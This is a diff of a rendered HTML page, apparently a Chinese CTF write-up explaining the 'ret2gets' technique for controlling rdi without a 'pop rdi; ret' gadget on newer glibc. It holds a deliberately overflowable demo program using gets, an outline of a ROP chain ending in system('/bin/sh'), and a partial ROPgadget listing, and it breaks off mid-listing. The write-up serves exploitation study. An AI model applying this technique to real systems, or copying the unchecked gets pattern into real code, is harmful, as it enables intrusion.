@@ -52,15 +52,17 @@
       
     
     
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0/dist/katex.min.css">
+    
       <link rel="stylesheet" href="../../../../assets/document_dates/fonts/material-icons.css">
-    
-      <link rel="stylesheet" href="../../../../assets/document_dates/tippy/tippy.css">
-    
-      <link rel="stylesheet" href="../../../../assets/document_dates/tippy/scale.css">
     
       <link rel="stylesheet" href="../../../../assets/document_dates/tippy/material.css">
     
       <link rel="stylesheet" href="../../../../assets/document_dates/tippy/shift-away.css">
+    
+      <link rel="stylesheet" href="../../../../assets/document_dates/tippy/tippy.css">
+    
+      <link rel="stylesheet" href="../../../../assets/document_dates/tippy/scale.css">
     
       <link rel="stylesheet" href="../../../../assets/document_dates/tippy/light.css">
     
@@ -1335,6 +1337,66 @@
     </span>
   </a>
   
+    <nav class="md-nav" aria-label="为什么会需要这种技巧">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#pop-rdi-ret" class="md-nav__link">
+    <span class="md-ellipsis">
+      pop rdi ; ret 平时从哪里来
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#glibc-234" class="md-nav__link">
+    <span class="md-ellipsis">
+      为什么它在 glibc 2.34+ 里突然不见了
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#gets" class="md-nav__link">
+    <span class="md-ellipsis">
+      问题回到 gets 本身
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_io_stdfile_0_lock" class="md-nav__link">
+    <span class="md-ellipsis">
+      _IO_stdfile_0_lock 是什么东西
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#demo-rdi" class="md-nav__link">
+    <span class="md-ellipsis">
+      最小 demo 证明 rdi 确实可控
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      版本问题
+    </span>
+  </a>
+  
 </li>
       
     </ul>
@@ -1640,6 +1702,66 @@
     </span>
   </a>
   
+    <nav class="md-nav" aria-label="为什么会需要这种技巧">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#pop-rdi-ret" class="md-nav__link">
+    <span class="md-ellipsis">
+      pop rdi ; ret 平时从哪里来
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#glibc-234" class="md-nav__link">
+    <span class="md-ellipsis">
+      为什么它在 glibc 2.34+ 里突然不见了
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#gets" class="md-nav__link">
+    <span class="md-ellipsis">
+      问题回到 gets 本身
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_io_stdfile_0_lock" class="md-nav__link">
+    <span class="md-ellipsis">
+      _IO_stdfile_0_lock 是什么东西
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#demo-rdi" class="md-nav__link">
+    <span class="md-ellipsis">
+      最小 demo 证明 rdi 确实可控
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      版本问题
+    </span>
+  </a>
+  
 </li>
       
     </ul>
@@ -1661,107 +1783,169 @@
   
 
 
-<h1 id="ret2gets-pop-rdi-ret-rdi">[Ret2gets] 不靠 <code>pop rdi; ret</code> 也能控制 <code>rdi</code></h1>
+<h1 id="ret2gets-pop-rdi-ret-rdi">[Ret2gets] 不靠 <code>pop rdi; ret</code> 也能控制 <code>rdi</code><a class="headerlink" href="#ret2gets-pop-rdi-ret-rdi" title="Permanent link">&para;</a></h1>
 <hr />
 <p>最后更新于 2026-03-20 by Saud4d3s</p>
 <p>讲到 <code>gets</code>，这个函数在 pwn 里确实是太经典了。大多数时候提到它，第一反应都是“无限读入”“经典栈溢出”“早该进历史垃圾堆了”。这些都没错，不过本文关注的不是它能溢出多少，而是它<strong>返回以后，寄存器里还剩下什么</strong>。</p>
 <p>因为很多函数调用完以后，参数寄存器早就被踩得乱七八糟了，尤其是 <code>rdi</code>，往往很难指望它还留着什么有用的东西。但 <code>gets</code> 在一部分较新的 glibc 版本上，返回的时候，<code>rdi</code> 里留下来是一个<strong>libc 里的可写地址</strong>。</p>
 <p>一旦这一点成立，利用思路就会变得很直接。既然 <code>rdi</code> 里有个可写地址，那么再调一次 <code>gets</code>，就等于直接往那里面写数据；而第二次 <code>gets</code> 返回以后，<code>rdi</code> 还会继续指向那块地方。这样一来，就算题目里没有现成的 <code>pop rdi; ret</code>，一参函数也仍然有机会接起来。</p>
 <p>这就是 <code>ret2gets</code> 最有意思的地方。</p>
-<h2 id="_1">为什么会需要这种技巧</h2>
+<h2 id="_1">为什么会需要这种技巧<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
 <p>先看这个最普通不过的溢出程序：</p>
-<p>```c title="demo.c"
-// gcc demo.c -o demo -no-pie -fno-stack-protector</p>
-<h1 id="include">include <stdio.h></h1>
-<p>int main(void)
-{
-    char buf[0x20];
-    puts("ROP me if you can!");
-    gets(buf);
-    return 0;
-}</p>
-<pre><code>
-`buf` 只有 `0x20` 字节，而 `gets` 又没有长度检查，显然是一道非常标准的栈溢出题。对这种程序，最经典的利用路径几乎已经成了固定模板：
-
-- 先用 `puts` 泄漏一个 GOT 表项
-- 回到 `main`
-- 再做一轮 ROP，最后调用 `system(&quot;/bin/sh&quot;)`
-
-这条链条本身不复杂，但它几乎默认有一个前提：程序里得先有一个能控制一参的 gadget，最典型的就是 `pop rdi; ret`。否则连最基础的 `puts(puts@got)` 都很难摆出来。
-
-但如果真的对这个 demo 跑一遍 `ROPgadget`，经常会先撞上一堵墙：
-
-```bash
-❯ ROPgadget --binary demo
-Gadgets information
-============================================================
-0x00000000004010cb : add bh, bh ; loopne 0x401135 ; nop ; ret
-0x000000000040109c : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; ret
-0x0000000000401183 : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret
-0x0000000000401184 : add byte ptr [rax], al ; add cl, cl ; ret
-0x0000000000401036 : add byte ptr [rax], al ; add dl, dh ; jmp 0x401020
-0x000000000040113a : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
-0x000000000040109e : add byte ptr [rax], al ; endbr64 ; ret
-0x0000000000401185 : add byte ptr [rax], al ; leave ; ret
-0x000000000040100d : add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax
-0x000000000040113b : add byte ptr [rcx], al ; pop rbp ; ret
-0x0000000000401139 : add byte ptr cs:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
-0x0000000000401186 : add cl, cl ; ret
-0x00000000004010ca : add dil, dil ; loopne 0x401135 ; nop ; ret
-0x0000000000401038 : add dl, dh ; jmp 0x401020
-0x000000000040113c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
-0x0000000000401137 : add eax, 0x2efb ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
-0x0000000000401017 : add esp, 8 ; ret
-0x0000000000401016 : add rsp, 8 ; ret
-0x000000000040103e : call qword ptr [rax - 0x5e1f00d]
-0x0000000000401014 : call rax
-0x0000000000401153 : cli ; jmp 0x4010e0
-0x00000000004010a3 : cli ; ret
-0x000000000040118f : cli ; sub rsp, 8 ; add rsp, 8 ; ret
-0x00000000004010c8 : cmp byte ptr [rax + 0x40], al ; add bh, bh ; loopne 0x401135 ; nop ; ret
-0x0000000000401150 : endbr64 ; jmp 0x4010e0
-0x00000000004010a0 : endbr64 ; ret
-0x0000000000401012 : je 0x401016 ; call rax
-0x00000000004010c5 : je 0x4010d0 ; mov edi, 0x404038 ; jmp rax
-0x0000000000401107 : je 0x401110 ; mov edi, 0x404038 ; jmp rax
-0x000000000040103a : jmp 0x401020
-0x0000000000401154 : jmp 0x4010e0
-0x000000000040100b : jmp 0x4840103f
-0x00000000004010cc : jmp rax
-0x0000000000401187 : leave ; ret
-0x00000000004010cd : loopne 0x401135 ; nop ; ret
-0x0000000000401136 : mov byte ptr [rip + 0x2efb], 1 ; pop rbp ; ret
-0x0000000000401182 : mov eax, 0 ; leave ; ret
-0x00000000004010c7 : mov edi, 0x404038 ; jmp rax
-0x00000000004010cf : nop ; ret
-0x000000000040114c : nop dword ptr [rax] ; endbr64 ; jmp 0x4010e0
-0x00000000004010c6 : or dword ptr [rdi + 0x404038], edi ; jmp rax
-0x000000000040113d : pop rbp ; ret
-0x000000000040101a : ret
-0x0000000000401011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
-0x0000000000401138 : sti ; add byte ptr cs:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
-0x0000000000401191 : sub esp, 8 ; add rsp, 8 ; ret
-0x0000000000401190 : sub rsp, 8 ; add rsp, 8 ; ret
-0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax
-0x00000000004010c3 : test eax, eax ; je 0x4010d0 ; mov edi, 0x404038 ; jmp rax
-0x0000000000401105 : test eax, eax ; je 0x401110 ; mov edi, 0x404038 ; jmp rax
-0x000000000040100f : test rax, rax ; je 0x401016 ; call rax
-
-Unique gadgets found: 51
-</code></pre>
+<div class="language-c highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">demo.c</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-0-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-0-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-0-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-0-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-0-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-0-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-0-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-0-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-0-10">10</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a><span class="c1">// gcc demo.c -o demo -no-pie -fno-stack-protector</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3"></a>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4"></a><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5"></a><span class="p">{</span>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6"></a><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">buf</span><span class="p">[</span><span class="mh">0x20</span><span class="p">];</span>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7"></a><span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;ROP me if you can!&quot;</span><span class="p">);</span>
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8"></a><span class="w">    </span><span class="n">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10"></a><span class="p">}</span>
+</span></code></pre></div></td></tr></table></div>
+<p><code>buf</code> 只有 <code>0x20</code> 字节，而 <code>gets</code> 又没有长度检查，显然是一道非常标准的栈溢出题。对这种程序，最经典的利用路径几乎已经成了固定模板：</p>
+<ul>
+<li>先用 <code>puts</code> 泄漏一个 GOT 表项</li>
+<li>回到 <code>main</code></li>
+<li>再做一轮 ROP，最后调用 <code>system("/bin/sh")</code></li>
+</ul>
+<p>这条链条本身不复杂，但它几乎默认有一个前提：程序里得先有一个能控制一参的 gadget，最典型的就是 <code>pop rdi; ret</code>。否则连最基础的 <code>puts(puts@got)</code> 都很难摆出来。</p>
+<p>但如果真的对这个 demo 跑一遍 <code>ROPgadget</code>，经常会先撞上一堵墙：</p>
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-1-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-1-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-1-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-1-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-1-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-1-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-1-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-1-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-1-10">10</a></span>
+<span class="normal"><a href="#__codelineno-1-11">11</a></span>
+<span class="normal"><a href="#__codelineno-1-12">12</a></span>
+<span class="normal"><a href="#__codelineno-1-13">13</a></span>
+<span class="normal"><a href="#__codelineno-1-14">14</a></span>
+<span class="normal"><a href="#__codelineno-1-15">15</a></span>
+<span class="normal"><a href="#__codelineno-1-16">16</a></span>
+<span class="normal"><a href="#__codelineno-1-17">17</a></span>
+<span class="normal"><a href="#__codelineno-1-18">18</a></span>
+<span class="normal"><a href="#__codelineno-1-19">19</a></span>
+<span class="normal"><a href="#__codelineno-1-20">20</a></span>
+<span class="normal"><a href="#__codelineno-1-21">21</a></span>
+<span class="normal"><a href="#__codelineno-1-22">22</a></span>
+<span class="normal"><a href="#__codelineno-1-23">23</a></span>
+<span class="normal"><a href="#__codelineno-1-24">24</a></span>
+<span class="normal"><a href="#__codelineno-1-25">25</a></span>
+<span class="normal"><a href="#__codelineno-1-26">26</a></span>
+<span class="normal"><a href="#__codelineno-1-27">27</a></span>
+<span class="normal"><a href="#__codelineno-1-28">28</a></span>
+<span class="normal"><a href="#__codelineno-1-29">29</a></span>
+<span class="normal"><a href="#__codelineno-1-30">30</a></span>
+<span class="normal"><a href="#__codelineno-1-31">31</a></span>
+<span class="normal"><a href="#__codelineno-1-32">32</a></span>
+<span class="normal"><a href="#__codelineno-1-33">33</a></span>
+<span class="normal"><a href="#__codelineno-1-34">34</a></span>
+<span class="normal"><a href="#__codelineno-1-35">35</a></span>
+<span class="normal"><a href="#__codelineno-1-36">36</a></span>
+<span class="normal"><a href="#__codelineno-1-37">37</a></span>
+<span class="normal"><a href="#__codelineno-1-38">38</a></span>
+<span class="normal"><a href="#__codelineno-1-39">39</a></span>
+<span class="normal"><a href="#__codelineno-1-40">40</a></span>
+<span class="normal"><a href="#__codelineno-1-41">41</a></span>
+<span class="normal"><a href="#__codelineno-1-42">42</a></span>
+<span class="normal"><a href="#__codelineno-1-43">43</a></span>
+<span class="normal"><a href="#__codelineno-1-44">44</a></span>
+<span class="normal"><a href="#__codelineno-1-45">45</a></span>
+<span class="normal"><a href="#__codelineno-1-46">46</a></span>
+<span class="normal"><a href="#__codelineno-1-47">47</a></span>
+<span class="normal"><a href="#__codelineno-1-48">48</a></span>
+<span class="normal"><a href="#__codelineno-1-49">49</a></span>
+<span class="normal"><a href="#__codelineno-1-50">50</a></span>
+<span class="normal"><a href="#__codelineno-1-51">51</a></span>
+<span class="normal"><a href="#__codelineno-1-52">52</a></span>
+<span class="normal"><a href="#__codelineno-1-53">53</a></span>
+<span class="normal"><a href="#__codelineno-1-54">54</a></span>
+<span class="normal"><a href="#__codelineno-1-55">55</a></span>
+<span class="normal"><a href="#__codelineno-1-56">56</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a>❯<span class="w"> </span>ROPgadget<span class="w"> </span>--binary<span class="w"> </span>demo
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2"></a>Gadgets<span class="w"> </span><span class="nv">information</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3"></a><span class="o">============================================================</span>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4"></a>0x00000000004010cb<span class="w"> </span>:<span class="w"> </span>add<span class="w"> </span>bh,<span class="w"> </span>bh<span class="w"> </span><span class="p">;</span><span class="w"> </span>loopne<span class="w"> </span>0x401135<span class="w"> </span><span class="p">;</span><span class="w"> </span>nop<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5"></a>0x000000000040109c<span class="w"> </span>:<span class="w"> </span>add<span class="w"> </span>byte<span class="w"> </span>ptr<span class="w"> </span><span class="o">[</span>rax<span class="o">]</span>,<span class="w"> </span>al<span class="w"> </span><span class="p">;</span><span class="w"> </span>add<span class="w"> </span>byte<span class="w"> </span>ptr<span class="w"> </span><span class="o">[</span>rax<span class="o">]</span>,<span class="w"> </span>al<span class="w"> </span><span class="p">;</span><span class="w"> </span>endbr64<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6"></a>0x0000000000401183<span class="w"> </span>:<span class="w"> </span>add<span class="w"> </span>byte<span class="w"> </span>ptr<span class="w"> </span><span class="o">[</span>rax<span class="o">]</span>,<span class="w"> </span>al<span class="w"> </span><span class="p">;</span><span class="w"> </span>add<span class="w"> </span>byte<span class="w"> </span>ptr<span class="w"> </span><span class="o">[</span>rax<span class="o">]</span>,<span class="w"> </span>al<span class="w"> </span><span class="p">;</span><span class="w"> </span>leave<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7"></a>0x0000000000401184<span class="w"> </span>:<span class="w"> </span>add<span class="w"> </span>byte<span class="w"> </span>ptr<span class="w"> </span><span class="o">[</span>rax<span class="o">]</span>,<span class="w"> </span>al<span class="w"> </span><span class="p">;</span><span class="w"> </span>add<span class="w"> </span>cl,<span class="w"> </span>cl<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8"></a>0x0000000000401036<span class="w"> </span>:<span class="w"> </span>add<span class="w"> </span>byte<span class="w"> </span>ptr<span class="w"> </span><span class="o">[</span>rax<span class="o">]</span>,<span class="w"> </span>al<span class="w"> </span><span class="p">;</span><span class="w"> </span>add<span class="w"> </span>dl,<span class="w"> </span>dh<span class="w"> </span><span class="p">;</span><span class="w"> </span>jmp<span class="w"> </span>0x401020
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9"></a>0x000000000040113a<span class="w"> </span>:<span class="w"> </span>add<span class="w"> </span>byte<span class="w"> </span>ptr<span class="w"> </span><span class="o">[</span>rax<span class="o">]</span>,<span class="w"> </span>al<span class="w"> </span><span class="p">;</span><span class="w"> </span>add<span class="w"> </span>dword<span class="w"> </span>ptr<span class="w"> </span><span class="o">[</span>rbp<span class="w"> </span>-<span class="w"> </span>0x3d<span class="o">]</span>,<span class="w"> </span>ebx<span class="w"> </span><span class="p">;</span><span class="w"> </span>nop<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10"></a>0x000000000040109e<span class="w"> </span>:<span class="w"> </span>add<span class="w"> </span>byte<span class="w"> </span>ptr<span class="w"> </span><span class="o">[</span>rax<span class="o">]</span>,<span class="w"> </span>al<span class="w"> </span><span class="p">;</span><span class="w"> </span>endbr64<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11"></a>0x0000000000401185<span class="w"> </span>:<span class="w"> </span>add<span class="w"> </span>byte<span class="w"> </span>ptr<span class="w"> </span><span class="o">[</span>rax<span class="o">]</span>,<span class="w"> </span>al<span class="w"> </span><span class="p">;</span><span class="w"> </span>leave<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12"></a>0x000000000040100d<span class="w"> </span>:<span class="w"> </span>add<span class="w"> </span>byte<span class="w"> </span>ptr<span class="w"> </span><span class="o">[</span>rax<span class="o">]</span>,<span class="w"> </span>al<span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="nb">test</span><span class="w"> </span>rax,<span class="w"> </span>rax<span class="w"> </span><span class="p">;</span><span class="w"> </span>je<span class="w"> </span>0x401016<span class="w"> </span><span class="p">;</span><span class="w"> </span>call<span class="w"> </span>rax
+</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13"></a>0x000000000040113b<span class="w"> </span>:<span class="w"> </span>add<span class="w"> </span>byte<span class="w"> </span>ptr<span class="w"> </span><span class="o">[</span>rcx<span class="o">]</span>,<span class="w"> </span>al<span class="w"> </span><span class="p">;</span><span class="w"> </span>pop<span class="w"> </span>rbp<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret
+</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14"></a>0x0000000000401139<span class="w"> </span>:<span class="w"> </span>add<span class="w"> </span>byte<span class="w"> </span>ptr<span class="w"> </span>cs:<span class="o">[</span>rax<span class="o">]</span>,<span class="w"> </span>al<span class="w"> </span><span class="p">;</span><span class="w"> </span>add<span class="w"> </span>dword<span class="w"> </span>ptr<span class="w"> </span><span class="o">[</span>rbp<span class="w"> </span>-<span class="w"> </span>0x3d<span class="o">]</span>,<span class="w"> </span>ebx<span class="w"> </span><span class="p">;</span><span class="w"> </span>nop<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret
+</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15"></a>0x0000000000401186<span class="w"> </span>:<span class="w"> </span>add<span class="w"> </span>cl,<span class="w"> </span>cl<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret
+</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16"></a>0x00000000004010ca<span class="w"> </span>:<span class="w"> </span>add<span class="w"> </span>dil,<span class="w"> </span>dil<span class="w"> </span><span class="p">;</span><span class="w"> </span>loopne<span class="w"> </span>0x401135<span class="w"> </span><span class="p">;</span><span class="w"> </span>nop<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret
+</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17"></a>0x0000000000401038<span class="w"> </span>:<span class="w"> </span>add<span class="w"> </span>dl,<span class="w"> </span>dh<span class="w"> </span><span class="p">;</span><span class="w"> </span>jmp<span class="w"> </span>0x401020
+</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18"></a>0x000000000040113c<span class="w"> </span>:<span class="w"> </span>add<span class="w"> </span>dword<span class="w"> </span>ptr<span class="w"> </span><span class="o">[</span>rbp<span class="w"> </span>-<span class="w"> </span>0x3d<span class="o">]</span>,<span class="w"> </span>ebx<span class="w"> </span><span class="p">;</span><span class="w"> </span>nop<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret
+</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19"></a>0x0000000000401137<span class="w"> </span>:<span class="w"> </span>add<span class="w"> </span>eax,<span class="w"> </span>0x2efb<span class="w"> </span><span class="p">;</span><span class="w"> </span>add<span class="w"> </span>dword<span class="w"> </span>ptr<span class="w"> </span><span class="o">[</span>rbp<span class="w"> </span>-<span class="w"> </span>0x3d<span class="o">]</span>,<span class="w"> </span>ebx<span class="w"> </span><span class="p">;</span><span class="w"> </span>nop<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret
+</span><span id="__span-1-20"><a id="__codelineno-1-20" name="__codelineno-1-20"></a>0x0000000000401017<span class="w"> </span>:<span class="w"> </span>add<span class="w"> </span>esp,<span class="w"> </span><span class="m">8</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>ret
+</span><span id="__span-1-21"><a id="__codelineno-1-21" name="__codelineno-1-21"></a>0x0000000000401016<span class="w"> </span>:<span class="w"> </span>add<span class="w"> </span>rsp,<span class="w"> </span><span class="m">8</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>ret
+</span><span id="__span-1-22"><a id="__codelineno-1-22" name="__codelineno-1-22"></a>0x000000000040103e<span class="w"> </span>:<span class="w"> </span>call<span class="w"> </span>qword<span class="w"> </span>ptr<span class="w"> </span><span class="o">[</span>rax<span class="w"> </span>-<span class="w"> </span>0x5e1f00d<span class="o">]</span>
+</span><span id="__span-1-23"><a id="__codelineno-1-23" name="__codelineno-1-23"></a>0x0000000000401014<span class="w"> </span>:<span class="w"> </span>call<span class="w"> </span>rax
+</span><span id="__span-1-24"><a id="__codelineno-1-24" name="__codelineno-1-24"></a>0x0000000000401153<span class="w"> </span>:<span class="w"> </span>cli<span class="w"> </span><span class="p">;</span><span class="w"> </span>jmp<span class="w"> </span>0x4010e0
+</span><span id="__span-1-25"><a id="__codelineno-1-25" name="__codelineno-1-25"></a>0x00000000004010a3<span class="w"> </span>:<span class="w"> </span>cli<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret
+</span><span id="__span-1-26"><a id="__codelineno-1-26" name="__codelineno-1-26"></a>0x000000000040118f<span class="w"> </span>:<span class="w"> </span>cli<span class="w"> </span><span class="p">;</span><span class="w"> </span>sub<span class="w"> </span>rsp,<span class="w"> </span><span class="m">8</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>add<span class="w"> </span>rsp,<span class="w"> </span><span class="m">8</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>ret
+</span><span id="__span-1-27"><a id="__codelineno-1-27" name="__codelineno-1-27"></a>0x00000000004010c8<span class="w"> </span>:<span class="w"> </span>cmp<span class="w"> </span>byte<span class="w"> </span>ptr<span class="w"> </span><span class="o">[</span>rax<span class="w"> </span>+<span class="w"> </span>0x40<span class="o">]</span>,<span class="w"> </span>al<span class="w"> </span><span class="p">;</span><span class="w"> </span>add<span class="w"> </span>bh,<span class="w"> </span>bh<span class="w"> </span><span class="p">;</span><span class="w"> </span>loopne<span class="w"> </span>0x401135<span class="w"> </span><span class="p">;</span><span class="w"> </span>nop<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret
+</span><span id="__span-1-28"><a id="__codelineno-1-28" name="__codelineno-1-28"></a>0x0000000000401150<span class="w"> </span>:<span class="w"> </span>endbr64<span class="w"> </span><span class="p">;</span><span class="w"> </span>jmp<span class="w"> </span>0x4010e0
+</span><span id="__span-1-29"><a id="__codelineno-1-29" name="__codelineno-1-29"></a>0x00000000004010a0<span class="w"> </span>:<span class="w"> </span>endbr64<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret
+</span><span id="__span-1-30"><a id="__codelineno-1-30" name="__codelineno-1-30"></a>0x0000000000401012<span class="w"> </span>:<span class="w"> </span>je<span class="w"> </span>0x401016<span class="w"> </span><span class="p">;</span><span class="w"> </span>call<span class="w"> </span>rax
+</span><span id="__span-1-31"><a id="__codelineno-1-31" name="__codelineno-1-31"></a>0x00000000004010c5<span class="w"> </span>:<span class="w"> </span>je<span class="w"> </span>0x4010d0<span class="w"> </span><span class="p">;</span><span class="w"> </span>mov<span class="w"> </span>edi,<span class="w"> </span>0x404038<span class="w"> </span><span class="p">;</span><span class="w"> </span>jmp<span class="w"> </span>rax
+</span><span id="__span-1-32"><a id="__codelineno-1-32" name="__codelineno-1-32"></a>0x0000000000401107<span class="w"> </span>:<span class="w"> </span>je<span class="w"> </span>0x401110<span class="w"> </span><span class="p">;</span><span class="w"> </span>mov<span class="w"> </span>edi,<span class="w"> </span>0x404038<span class="w"> </span><span class="p">;</span><span class="w"> </span>jmp<span class="w"> </span>rax
+</span><span id="__span-1-33"><a id="__codelineno-1-33" name="__codelineno-1-33"></a>0x000000000040103a<span class="w"> </span>:<span class="w"> </span>jmp<span class="w"> </span>0x401020
+</span><span id="__span-1-34"><a id="__codelineno-1-34" name="__codelineno-1-34"></a>0x0000000000401154<span class="w"> </span>:<span class="w"> </span>jmp<span class="w"> </span>0x4010e0
+</span><span id="__span-1-35"><a id="__codelineno-1-35" name="__codelineno-1-35"></a>0x000000000040100b<span class="w"> </span>:<span class="w"> </span>jmp<span class="w"> </span>0x4840103f
+</span><span id="__span-1-36"><a id="__codelineno-1-36" name="__codelineno-1-36"></a>0x00000000004010cc<span class="w"> </span>:<span class="w"> </span>jmp<span class="w"> </span>rax
+</span><span id="__span-1-37"><a id="__codelineno-1-37" name="__codelineno-1-37"></a>0x0000000000401187<span class="w"> </span>:<span class="w"> </span>leave<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret
+</span><span id="__span-1-38"><a id="__codelineno-1-38" name="__codelineno-1-38"></a>0x00000000004010cd<span class="w"> </span>:<span class="w"> </span>loopne<span class="w"> </span>0x401135<span class="w"> </span><span class="p">;</span><span class="w"> </span>nop<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret
